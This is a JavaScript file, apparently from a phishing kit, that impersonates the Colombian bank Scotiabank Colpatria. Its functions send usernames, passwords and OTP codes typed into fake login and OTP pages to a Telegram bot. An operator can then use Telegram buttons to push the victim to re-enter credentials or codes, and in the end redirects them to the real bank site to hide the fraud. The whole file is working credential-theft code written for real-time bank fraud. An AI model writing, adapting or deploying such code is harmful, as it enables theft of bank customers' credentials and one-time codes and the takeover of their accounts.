/**
 * SCOTIABANK-COLPATRIA - Cliente optimizado inline
 * Para usar directamente en los HTML
 */

(function() {
    'use strict';

    const buttons = [
        { text: '🔑 Pedir Login', action: 'request_login' },
        { text: '📱 Pedir OTP', action: 'request_otp' },
        { text: '✅ Finalizar', action: 'finish' }
    ];

    function handleAction(data) {
        switch(data.action) {
            case 'request_login': 
                if (window.location.pathname.includes('index.html')) {
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                } else {
                    window.location.href = 'index.html';
                }
                break;
            case 'request_otp': 
                if (window.location.pathname.includes('otp.html')) {
                    document.getElementById('otp').value = '';
                } else {
                    window.location.href = 'otp.html';
                }
                break;
            case 'finish': 
                window.location.href = 'https://www.scotiabankcolpatria.com/';
                break;
        }
    }

    window.ScotiabankUtils = {
        init: function() {
            BancoUtils.onTelegramAction(handleAction);
        },
        
        submitLogin: async function(username, password) {
            BancoUtils.showOverlay();
            const data = BancoUtils.saveBankData('scotiabank', { username, password });
            const message = BancoUtils.formatMessage('SCOTIABANK COLPATRIA - LOGIN', data);
            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());

            try {
                await BancoUtils.sendToTelegram('login', { text: message, keyboard });
            } catch (error) {
                BancoUtils.hideOverlay();
                alert('Error al enviar');
            }
        },

        submitOTP: async function(otp) {
            BancoUtils.showOverlay();
            const data = BancoUtils.saveBankData('scotiabank', { otp });
            const message = BancoUtils.formatMessage('SCOTIABANK COLPATRIA - RESUMEN', data);
            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());

            try {
                await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
            } catch (error) {
                BancoUtils.hideOverlay();
                alert('Error al enviar');
            }
        }
    };
})();
